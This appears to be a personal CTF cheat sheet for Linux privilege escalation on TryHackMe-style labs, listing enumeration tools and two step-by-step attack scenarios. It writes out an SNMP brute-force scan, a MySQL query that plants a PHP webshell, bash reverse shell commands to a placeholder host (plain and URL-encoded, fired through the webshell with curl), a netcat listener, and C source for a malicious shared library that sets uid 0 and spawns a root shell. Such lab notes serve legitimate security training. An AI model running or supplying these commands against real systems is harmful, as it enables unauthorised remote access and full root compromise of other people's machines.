# [Linux Privilege Escalation](https://github.com/Haxxenigma/CybSecChallenges/blob/main/TryHackMe/Linux-Privilege-Escalation.md)

[GTFOBins](https://gtfobins.github.io/)

[Linux Kernerl CVEs](https://www.linuxkernelcves.com/cves)

[Rapid7](https://www.rapid7.com/)

[ExploitDB](https://www.exploit-db.com/)

- [Searchsploit - ExploitDB in CLI](https://www.kali.org/tools/exploitdb/)

- [MySQL - User-Defined Function (UDF)](https://www.exploit-db.com/exploits/1518)

### Linux Privilege Escalation Scripts

[LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

[LinEnum](https://github.com/rebootuser/LinEnum)

[Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)

[Linux Priv Checker](https://github.com/linted/linuxprivchecker)

[Linux Exploit Suggester](https://github.com/The-Z-Labs/linux-exploit-suggester)

[Linux Exploit Suggester 2 & Dirty Cow](https://github.com/Haxxenigma/TryHackMe/tree/main/Linux-PrivEsc-Scripts/kernel-exploits)

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

- [Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

[pentestmonkey — php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

## Scenario 1 (Bash Reverse Shell)

- SNMP Brute Script

    ```shell
    nmap -sU -p161 -sV --script=snmp-brute <ip>
    ```

- SNMP Processes Script

    ```shell
    nmap -sU -p161 --script=snmp-processes <ip>
    ```

- Interact with MySQL Server

    ```shel
    mysql -u <user> -p<pass> -h <ip>
    ```

- Check whether MySQL service can be leveraged to write into the web root directory

    ```sql
    select "<?php system($_GET['cmd'])?>" into outfile "/var/www/html/shell.php";
    ```

- Access the webshell

    ```shell
    curl http://<ip>/shell.php?cmd=id
    ```

- Bash Reverse Shell

    ```shell
    bash -i >& /dev/tcp/<ip>/<port> 0>&1
    ```

- Bash Reverse Shell Command

    ```shell
    /bin/bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'
    ```

- URL Encoded Bash Reverse Shell Command

    ```shell
    %2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F%3Cip%3E%2F%3Cport%3E%200%3E%261%27
    ```

- Execute Bash Reverse Shell Command

    ```shell
    curl 'http://<ip>/shell.php?cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F%3Cip%3E%2F%3Cport%3E%200%3E%261%27'
    ```

- [netcat](https://www.kali.org/tools/netcat/)

    ```shell
    rlwrap nc -vnlp 53
    ```

- Upgrade the shell to a fully interactive shell

    ```shell
    python -c 'import pty; pty.spawn("/bin/bash");'
    ```

    ```shell
    Ctrl + Z
    ```
    
    ```shell
    stty raw -echo
    ```
    
    ```shell
    fg
    ```

## Scenario 2 (SUID binaries & shared libs)

- Search for SUID binaries on the system

    ```shell
    find / -perm -u=s -type f 2>/dev/null
    ```

- execute binary

- Identify *the writable directory* among the *shared library paths*

- Write the c program for malicious shared library

    ```c
    #include<stdio.h>
    #include<stdlib.h>
    #include<unistd.h>

    int welcome(){
        setuid(0);
        setgid(0);
        system("/bin/bash");
    }
    ```

- Compile the shared library

    ```shell
    gcc -shared -o scrypt.so -fPIC scrypt.c
    ```

- Execute `scrypt.so`

# Crontab

[Crontab Generator](https://crontab-generator.org/)

[Crontab Guru](https://crontab.guru/)

```shell
crontab -e
```

# Other cheatsheets

<https://github.com/Rajchowdhury420/CTF-CheatSheet>

<https://dvd848.github.io/CTFs/CheatSheet.html>

<https://github.com/JohnHammond/ctf-katana>

<https://github.com/apsdehal/aWEsoMe-cTf>